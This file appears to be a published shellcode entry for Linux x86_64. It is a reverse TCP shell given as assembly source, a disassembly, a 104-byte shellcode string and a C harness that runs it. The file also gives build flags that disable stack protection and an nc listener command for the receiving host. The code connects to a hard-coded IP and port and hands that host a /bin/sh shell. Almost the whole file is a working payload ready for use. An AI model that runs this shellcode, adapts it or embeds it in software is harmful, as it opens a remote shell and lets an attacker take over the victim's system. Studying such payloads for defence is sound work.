/*
;Category: Shellcode
;Title: GNU/Linux x86_64 - Reverse Shell Shellcode
;Author: m4n3dw0lf
;Github: https://github.com/m4n3dw0lf
;Date: 18/07/2017
;Architecture: Linux x86_64
;Tested on: #1 SMP Debian 4.9.18-1 (2017-03-30) x86_64 GNU/Linux

##########
# Source #
##########

section .text
  global _start
    _start:
        push rbp
        mov rbp,rsp
        xor rdx, rdx
        push 1
        pop rsi
        push 2
        pop rdi
        push 41
        pop rax ; sys_socket
        syscall
        sub rsp, 8
        mov dword [rsp], 0x5c110002 ; Port 4444, 4Bytes: 0xPORT + Fill with '0's + 2
        mov dword [rsp+4], 0x801a8c0 ; IP Address 192.168.1.8, 4Bytes: 0xIPAddress (Little Endiannes)
        lea rsi, [rsp]
        add rsp, 8
        pop rbx
        xor rbx, rbx
        push 16
        pop rdx
        push 3
        pop rdi
        push 42
        pop rax; sys_connect
        syscall
        xor rsi, rsi
    shell_loop:
        mov al, 33
        syscall
        inc rsi
        cmp rsi, 2
        jle shell_loop
        xor rax, rax
        xor rsi, rsi
        mov rdi, 0x68732f6e69622f2f
        push rsi
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        mov al, 59
        syscall

#################################
# Compile and execute with NASM #
#################################

nasm -f elf64 reverse_tcp_shell.s -o reverse_tcp_shell.o
ld reverse_tcp_shell.o -o reverse_tcp_shell

#########################
# objdump --disassemble #
#########################

reverse_tcp_shell:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	55                   	push   %rbp
  400081:	48 89 e5             	mov    %rsp,%rbp
  400084:	48 31 d2             	xor    %rdx,%rdx
  400087:	6a 01                	pushq  $0x1
  400089:	5e                   	pop    %rsi
  40008a:	6a 02                	pushq  $0x2
  40008c:	5f                   	pop    %rdi
  40008d:	6a 29                	pushq  $0x29
  40008f:	58                   	pop    %rax
  400090:	0f 05                	syscall
  400092:	48 83 ec 08          	sub    $0x8,%rsp
  400096:	c7 04 24 02 00 11 5c 	movl   $0x5c110002,(%rsp)
  40009d:	c7 44 24 04 c0 a8 01 	movl   $0x801a8c0,0x4(%rsp)
  4000a4:	08
  4000a5:	48 8d 34 24          	lea    (%rsp),%rsi
  4000a9:	48 83 c4 08          	add    $0x8,%rsp
  4000ad:	5b                   	pop    %rbx
  4000ae:	48 31 db             	xor    %rbx,%rbx
  4000b1:	6a 10                	pushq  $0x10
  4000b3:	5a                   	pop    %rdx
  4000b4:	6a 03                	pushq  $0x3
  4000b6:	5f                   	pop    %rdi
  4000b7:	6a 2a                	pushq  $0x2a
  4000b9:	58                   	pop    %rax
  4000ba:	0f 05                	syscall
  4000bc:	48 31 f6             	xor    %rsi,%rsi

00000000004000bf <shell_loop>:
  4000bf:	b0 21                	mov    $0x21,%al
  4000c1:	0f 05                	syscall
  4000c3:	48 ff c6             	inc    %rsi
  4000c6:	48 83 fe 02          	cmp    $0x2,%rsi
  4000ca:	7e f3                	jle    4000bf <shell_loop>
  4000cc:	48 31 c0             	xor    %rax,%rax
  4000cf:	48 31 f6             	xor    %rsi,%rsi
  4000d2:	48 bf 2f 2f 62 69 6e 	movabs $0x68732f6e69622f2f,%rdi
  4000d9:	2f 73 68
  4000dc:	56                   	push   %rsi
  4000dd:	57                   	push   %rdi
  4000de:	48 89 e7             	mov    %rsp,%rdi
  4000e1:	48 31 d2             	xor    %rdx,%rdx
  4000e4:	b0 3b                	mov    $0x3b,%al
  4000e6:	0f 05                	syscall


#######################
# 104 Bytes Shellcode #
#######################

for i in `objdump -d reverse_tcp_shell | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done

\x55\x48\x89\xe5\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x83\xec\x08\xc7\x04\x24\x02\x00\x11\x5c\xc7\x44\x24\x04\xc0\xa8\x01\x08\x48\x8d\x34\x24\x48\x83\xc4\x08\x5b\x48\x31\xdb\x6a\x10\x5a\x6a\x03\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\x31\xf6\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05

########
# Test #
########

In the asm source:
  mov dword [rsp+4], 0x801a8c0 <IP Address (Little Endian) of the host that will receive the shell>

In the host that will receive the shell run:
  nc -vvlp 4444

On the target machine:
   compile with:
     gcc -fno-stack-protector -z execstack reverse_tcp_shell.c -o reverse_tcp_shell
   run:
     ./reverse_tcp_shell


 <!> gcc -fno-stack-protector -z execstack reverse_tcp_shell.c -o reverse_tcp_shell
*/

#include <stdio.h>

unsigned char shellcode[] = "\x55\x48\x89\xe5\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x83\xec\x08\xc7\x04\x24\x02\x00\x11\x5c\xc7\x44\x24\x04\xc0\xa8\x01\x08\x48\x8d\x34\x24\x48\x83\xc4\x08\x5b\x48\x31\xdb\x6a\x10\x5a\x6a\x03\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\x31\xf6\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05";
main()
{
    int (*ret)() = (int(*)())shellcode;
    ret();
}